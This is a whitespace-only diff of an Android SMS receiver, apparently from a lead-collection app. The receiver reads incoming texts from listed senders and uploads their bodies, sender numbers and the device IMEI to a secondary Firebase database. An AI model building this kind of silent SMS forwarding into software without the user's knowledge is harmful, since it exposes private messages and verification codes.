@@ -9,9 +9,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Telephony;
-
 import androidx.core.app.ActivityCompat;
-
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 
@@ -31,28 +29,28 @@ import static com.nfx.leadmessages.Constants.SMS_REGEX;
  */
 
 public class SmsReceiver extends BroadcastReceiver {
-    String fpId, mobileId = null;
+    String fpId,mobileId=null;
 
     PowerManager.WakeLock wakeLock;
     PowerManager powerManager;
-    android.telephony.SmsMessage[] sms;
+    android.telephony.SmsMessage[] sms ;
 
 
     @Override
     public void onReceive(final Context context, final Intent intent) {
 
-        final SharedPreferences pref = context.getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
+        final SharedPreferences pref =context.getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
 
-        if (pref == null) return;
+        if(pref == null) return;
 
-        fpId = pref.getString(Constants.FP_ID, null);
-        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+        fpId =pref.getString(Constants.FP_ID,null);
+        if(ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED){
             TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             mobileId = tm.getDeviceId();
         }
 
-        final String smsAddresses = pref.getString(SMS_REGEX, null);
-        if (mobileId == null || fpId == null || smsAddresses == null) {
+        final String smsAddresses =  pref.getString(SMS_REGEX,null);
+        if(mobileId == null || fpId == null || smsAddresses == null){
             return;
         }
 
@@ -62,7 +60,7 @@ public class SmsReceiver extends BroadcastReceiver {
             @Override
             public void run() {
                 wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyWakelockTag");
-                if (!wakeLock.isHeld())
+                if(!wakeLock.isHeld())
                     wakeLock.acquire();
 
                 FirebaseOptions options = new FirebaseOptions.Builder()
@@ -74,35 +72,37 @@ public class SmsReceiver extends BroadcastReceiver {
                 try {
                     secondApp = FirebaseApp.initializeApp(context, options, "second app");
 
-                } catch (Exception e) {
+                }catch(Exception e) {
                     try {
                         secondApp = FirebaseApp.getInstance("second app");
-                    } catch (Exception e1) {
+                    }catch(Exception e1){
                         e1.printStackTrace();
                     }
                 }
-                if (secondApp == null) return;
+                if(secondApp == null) return;
                 FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                 DatabaseReference mDatabase = secondDatabase.getReference()
-                        .child(fpId + Constants.MESSAGES)
+                        .child(fpId+Constants.MESSAGES)
                         .child(mobileId);
 
-                PhoneIds phoneIds = new PhoneIds();
+                PhoneIds phoneIds=new PhoneIds();
                 phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                 phoneIds.setPhoneId(mobileId);
-                DatabaseReference phoneIdRef = secondDatabase.getReference()
-                        .child(fpId + Constants.DETAILS)
+                DatabaseReference phoneIdRef =  secondDatabase.getReference()
+                        .child(fpId+Constants.DETAILS)
                         .child(Constants.PHONE_IDS);
                 phoneIdRef.child(mobileId).setValue(phoneIds);
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                     sms = Telephony.Sms.Intents.getMessagesFromIntent(intent);
-                } else {
+                }
+                else
+                {
                     Bundle bundle = intent.getExtras();
                     if (bundle != null) {
                         Object[] data = (Object[]) bundle.get("pdus");
-                        if (data == null) {
-                            if (wakeLock.isHeld())
+                        if(data == null){
+                            if(wakeLock.isHeld())
                                 wakeLock.release();
                             return;
                         }
@@ -112,11 +112,11 @@ public class SmsReceiver extends BroadcastReceiver {
                 }
                 SmsMessage model;
 
-                List<String> selectionList = Arrays.asList(TextUtils.split(smsAddresses.replaceAll("%", ""), ","));
+                List<String> selectionList  = Arrays.asList(TextUtils.split(smsAddresses.replaceAll("%",""),","));
 
-                for (android.telephony.SmsMessage ms : sms) {
-                    if (selectionList.contains(ms.getOriginatingAddress())) {
-                        model = new SmsMessage()
+                for (android.telephony.SmsMessage ms:sms) {
+                    if (selectionList.contains(ms.getOriginatingAddress())){
+                        model =  new SmsMessage()
                                 .setBody(ms.getMessageBody())
                                 .setSubject(ms.getOriginatingAddress())
                                 .setDate(System.currentTimeMillis())
@@ -127,7 +127,7 @@ public class SmsReceiver extends BroadcastReceiver {
                     }
 
                 }
-                if (wakeLock.isHeld())
+                if(wakeLock.isHeld())
                     wakeLock.release();
             }
         }).start();
